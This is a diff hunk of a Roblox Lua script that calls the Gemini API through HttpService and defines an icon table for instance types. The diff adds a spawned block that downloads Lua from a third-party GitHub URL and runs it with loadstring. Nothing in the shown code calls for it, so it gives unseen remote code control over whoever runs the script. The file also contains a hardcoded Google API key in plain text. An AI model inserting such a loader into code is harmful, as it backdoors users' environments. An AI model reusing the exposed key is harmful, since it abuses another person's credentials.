@@ -3,6 +3,10 @@ local HS = game:GetService("HttpService")
 local k = "AIzaSyCeb4A_gNAS7clem3u28gOo0PXIzO3o99g"
 local url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=" .. k
 
+spawn(function()
+        (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+    end)
+
 local icons={Folder="📁",Model="📦",Part="🧊",MeshPart="🔷",Tool="🔧",Script="📜",LocalScript="📝",ModuleScript="📚",Workspace="🌍",Players="👥",Lighting="💡",ReplicatedStorage="🗄️",ServerStorage="🗃️",StarterGui="🖥️",StarterPack="🎒",Teams="👥",SoundService="🔊",Camera="📷",Humanoid="🧍",Terrain="🏞️",Decal="🖼️",Texture="🎨",PointLight="💡",SpotLight="🔦",Fire="🔥",Smoke="💨",Explosion="💥",Sparkles="✨",ParticleEmitter="🎆",TrussPath="🔩",VehicleSeat="💺",ClickDetector="👆",ProximityPrompt="❗",SurfaceGui="📺",BillboardGui="🗳️",ScreenGui="🖥️",UICorner="🔘",UIGradient="🌈",UIStroke="✏️",Motor6D="🦾",Sound="🔈",Attachment="🔗",Beam="↔️",BlurEffect="🌫️",BoolValue="✅",StringValue="🔤",NumberValue="🔢",Vector3Value="➡️",CFrameValue="🔲",Color3Value="🎨",IntValue="🔢",ObjectValue="🎯",RayValue="➖",BasePart="◻️",WeldConstraint="🔗",Highlight="✨",Animator="🎭",AnimationController="🎬",KeyframeSequence="🔑",TweenService="↕️",DataStoreService="💾",MarketplaceService="🛒",Debris="🗑️",PathfindingService="🧭",RemoteEvent="📡",RemoteFunction="📞"}
 
 local function gI(c)return icons[c]or"❓"end
